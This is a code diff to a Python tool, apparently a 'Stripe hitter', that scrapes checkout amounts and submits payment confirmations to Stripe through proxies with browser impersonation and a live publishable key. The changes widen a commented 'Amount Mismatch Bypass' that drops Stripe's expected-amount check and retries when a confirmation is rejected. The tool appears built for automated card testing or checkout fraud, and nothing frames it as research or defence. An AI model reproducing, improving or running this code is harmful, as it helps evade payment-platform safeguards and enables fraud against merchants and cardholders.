@@ -112,7 +112,7 @@ class StripeAPIExtractor:
                     merchant = resp_json['statement_descriptor']
                     
                 currency = resp_json.get('currency', 'usd').upper()
-                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount else None, 'raw_amount': amount, 'merchant': merchant}
+                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant}
             return {'success': False}
         except: return {'success': False}
 
@@ -606,7 +606,7 @@ class StripeAPIHitter:
                     "expected_payment_method_type": "card",
                     "key": self.pk_live,
                 }
-                if self.raw_amount is not None:
+                if self.raw_amount is not None and self.raw_amount > 0:
                     confirm_data["expected_amount"] = self.raw_amount
                 
                 confirm_headers = headers.copy()
@@ -618,7 +618,9 @@ class StripeAPIHitter:
                 
                 # Dynamic Amount Mismatch Bypass
                 # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
-                if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch' and 'expected_amount' in confirm_data:
+                err_code = confirm_json.get('error', {}).get('code')
+                err_msg = confirm_json.get('error', {}).get('message', '')
+                if confirm_res.status_code != 200 and 'expected_amount' in confirm_data and (err_code == 'checkout_amount_mismatch' or 'expected_amount' in err_msg):
                     del confirm_data['expected_amount']
                     confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                     confirm_json = confirm_res.json()
